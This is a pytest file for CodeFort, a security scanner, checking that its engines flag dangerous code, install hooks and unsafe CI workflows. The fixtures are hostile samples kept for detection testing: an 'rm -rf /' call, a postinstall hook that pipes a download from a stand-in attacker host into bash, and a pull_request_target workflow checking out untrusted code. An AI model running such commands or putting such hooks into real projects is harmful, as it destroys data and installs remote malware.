"""
Tests for CodeFort Security Analysis Engines.
"""

import pytest
from app.engines.code_engine import CodeEngine, FileChange as CodeFileChange
from app.engines.dependency_engine import DependencyEngine, FileChange as DepFileChange
from app.engines.workflow_engine import WorkflowEngine, FileChange as WFFileChange
from app.services.policy_engine import PolicyEngine
from codefort_schemas.models import Finding, Severity, Confidence, PolicyDecision


@pytest.mark.asyncio
async def test_code_engine_detects_dangerous_calls():
    """Verify Code Engine detects subprocess and eval calls."""
    engine = CodeEngine()
    malicious_code = """
import os
import subprocess

def run_payload():
    subprocess.call(["rm", "-rf", "/"])
    eval("__import__('os').system('ls')")
"""
    files = [CodeFileChange(path="test_script.py", content=malicious_code)]
    result = await engine.analyze(files)
    assert result.status.value == "success"
    rule_ids = [f.rule_id for f in result.findings]
    assert any("subprocess" in rid for rid in rule_ids)
    assert any("eval_exec" in rid for rid in rule_ids)


@pytest.mark.asyncio
async def test_dependency_engine_detects_install_hook():
    """Verify Dependency Engine flags postinstall script in package.json."""
    engine = DependencyEngine()
    manifest = """{
  "name": "sample-pkg",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -s http://attacker.com/malware | bash"
  }
}"""
    files = [DepFileChange(path="package.json", content=manifest)]
    result = await engine.analyze(files)
    assert result.status.value == "success"
    assert any(f.rule_id == "dependency.install_hook@1" for f in result.findings)


@pytest.mark.asyncio
async def test_workflow_engine_detects_untrusted_checkout():
    """Verify Workflow Engine flags pull_request_target with head ref checkout."""
    engine = WorkflowEngine()
    wf_content = """
name: CI
on:
  pull_request_target:
    types: [opened]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
"""
    files = [WFFileChange(path=".github/workflows/ci.yml", content=wf_content)]
    result = await engine.analyze(files)
    assert result.status.value == "success"
    rule_ids = [f.rule_id for f in result.findings]
    assert any("untrusted_checkout" in rid for rid in rule_ids)
    assert any("pull_request_target" in rid for rid in rule_ids)


def test_policy_engine_blocks_on_critical():
    """Verify Policy Engine issues BLOCK decision when critical finding is present."""
    policy = PolicyEngine()
    critical_finding = Finding(
        finding_id="f1",
        rule_id="code.eval_exec@1",
        severity=Severity.CRITICAL,
        confidence=Confidence.HIGH,
        title="Critical eval execution",
        description="Arbitrary code execution",
        explanation_key="code.eval_exec"
    )
    result = policy.evaluate([critical_finding])
    assert result.decision == PolicyDecision.BLOCK
    assert "code.eval_exec@1" in result.triggered_rules
